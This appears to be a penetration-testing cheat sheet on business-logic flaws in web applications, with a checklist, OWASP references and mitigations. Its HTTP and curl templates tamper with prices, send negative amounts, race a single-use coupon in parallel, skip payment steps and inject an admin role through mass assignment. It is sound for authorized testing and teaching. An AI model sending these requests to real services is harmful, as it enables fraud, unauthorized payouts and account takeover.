## 🧠 Business Logic Cheat Sheet

> **Scope:** Authorized testing only — systems you own or have explicit written permission to assess. Use placeholders (`<TARGET>`, `<TOKEN>`, `<USER>`, `<ORDER_ID>`, `<COUPON>`); never store real flags, API keys, credentials, or financial data.

---

### ⚡ 1. Quick Reference

| Abuse | Idea |
|-------|------|
| Price manipulation | Client supplies price, discount, currency, or tax |
| Negative quantities | `-1` items reverse a total or credit an account |
| Race conditions | Parallel requests spend one balance/coupon twice |
| Coupon reuse | Single-use code applied repeatedly or concurrently |
| Workflow skipping | Call step 3's endpoint without completing step 2 |
| IDOR-like state change | Change `userId`/`orderId` in a state-changing request |
| Mass assignment | Send privileged fields the UI never renders |

### 🧭 2. Methodology

1. Map the flow: request → validation → state change → confirmation → notification.
2. List every client-controlled value: prices, IDs, roles, flags, steps, amounts, timestamps.
3. Ask "what does the server assume cannot happen?", then make it happen.
4. Compare roles/tenants; replay steps out of order, twice, and in parallel; verify final state.

### 💰 3. Price Manipulation

```http
POST /api/cart/items HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN>
Content-Type: application/json

{"productId":"<PRODUCT_ID>","quantity":1,"unitPrice":"<ATTACKER_PRICE>","currency":"USD"}
```

| Test | Example | Reveals |
|------|---------|---------|
| Client-side price | `unitPrice: "<ATTACKER_PRICE>"` | Server trusts client totals |
| Hidden field / discount | `price=<ATTACKER_PRICE>`, `discountPercent: 100` | Client-controlled totals |
| Currency / minor units | `<OTHER_CURRENCY>`, `1` vs `100` | FX / cents-vs-dollars confusion |
| Float / rounding | `0.005`, `0.1 + 0.2` | Totals rounded to zero |
| Adjustments | `tax: -<AMOUNT>`, `shipping: -<AMOUNT>` | Negative totals |

Compare the cart total with the amount actually charged at every step.

### ➖ 4. Negative & Boundary Quantities

```json
{"productId":"<PRODUCT_ID>","quantity":-1}
{"productId":"<PRODUCT_ID>","quantity":0}
{"productId":"<PRODUCT_ID>","quantity":1e9}
{"productId":"<PRODUCT_ID>","quantity":"-1"}
```

Test whether negative amounts reverse debits/credits, refunds exceed payments, or stock drops below zero. Try string vs numeric types, `null`, `[]`, and `{}` on loosely typed backends.

### 🎟️ 5. Coupons & Race Conditions

```bash
# Parallel single-use coupon redemption / double-spend probe
seq 1 20 | xargs -P 20 -I {} curl -s -X POST 'https://<TARGET>/api/coupons/apply' \
  -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' \
  -d '{"code":"<COUPON>","orderId":"<ORDER_ID>"}'
curl -s -X POST 'https://<TARGET>/api/transfer' -H 'Authorization: Bearer <TOKEN>' \
  -d '{"to":"<USER>","amount":-<AMOUNT>}'
```

| Flow | Race to test |
|------|--------------|
| Withdrawal / transfer | Two debits, one balance check |
| Coupon redemption | Two orders, one code |
| Stock / OTP | Oversell last item; reuse one-time code |
| Invite / referral | Duplicate bonus credit |

Use Burp Turbo Intruder or parallel `curl` to align request timing; check resulting DB state, not just status codes. Also test coupon reuse, stacking, expiry, eligibility, and minimum-basket bypass.

### ⏭️ 6. Workflow Step Skipping (跳过)

```http
POST /api/checkout/confirm HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN>

{"orderId":"<ORDER_ID>","paymentConfirmed":true,"emailVerified":true}
```

| Skip | Test |
|------|------|
| Payment | Call `/confirm` or `/fulfill` right after cart creation |
| Verification | Access protected pages with `verified: true` in body/token |
| KYC / approval | Jump from `submitted` to `approved` via a state parameter |
| Multi-step forms | POST step 3 fields without step 1/2 markers |
| Method override / replay | Override verb; resend confirmations after cancellation |

`PATCH /api/orders/<ORDER_ID> {"status":"refunded"}` must reject illegal transitions even for authenticated users.

### 🪪 7. IDOR-Like State Changes & Mass Assignment

```http
PATCH /api/users/<USER> HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN>

{"email":"<NEW_EMAIL>","role":"admin","isVerified":true,"balance":<AMOUNT>}

POST /api/addresses HTTP/1.1
Host: <TARGET>
Authorization: Bearer <TOKEN>

{"userId":"<OTHER_USER>","address":"<NEW_ADDRESS>","isDefault":true}
```

Swap IDs in URLs and bodies; add fields the UI never sends (`role`, `price`, `approved`); change tenant/org IDs; reuse another user's step/csrf token.

### 🛠️ 8. Tooling & Impact

| Tool | Use |
|------|-----|
| **Burp Repeater / Turbo Intruder** | Replay flows; precise race timing |
| **ffuf / DevTools** | Enumerate IDs/statuses; inspect hidden fields and price logic |

Impact: zero/negative-priced orders, unauthorized refunds or payouts, account takeover via mass assignment, cross-user/tenant state changes, bypass of approval gates, and inventory/audit corruption.

---

### 🛡️ 9. Mitigation

1. Derive prices, discounts, tax, and totals from server-side catalog data only.
2. Validate ranges/types: positive integers, bounded amounts, non-negative adjustments.
3. Model allowed state transitions explicitly; reject illegal transitions server-side.
4. Use atomic transactions, row/version locks, idempotency keys, and unique constraints.
5. Record coupon redemption per user/order with a unique constraint.
6. Bind each step to a server-side session/state token; allowlist assignable fields.
7. Authorize every object by owner/tenant before any read **or write**; audit anomalies.

---

### ✅ 10. Testing Checklist

- [ ] Map every client-controlled field in the money/state flow.
- [ ] Tamper prices, discounts, currency, tax, and rounding inputs.
- [ ] Test negative, zero, fractional, huge, and typed quantities.
- [ ] Test coupon reuse, stacking, expiry, eligibility, and parallel redemption.
- [ ] Test double-spend; skip workflow steps by calling later endpoints directly.
- [ ] Test status/method override and replay of stale confirmations.
- [ ] Swap IDs in URLs/bodies; inject privileged fields; verify final state and audit trail.

---

### 📚 11. References

- [OWASP WSTG: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/)
- [PortSwigger: Business logic vulnerabilities](https://portswigger.net/web-security/business-logic)
- [PortSwigger: Race conditions](https://portswigger.net/web-security/race-conditions)

**🧠 Happy authorized testing!**
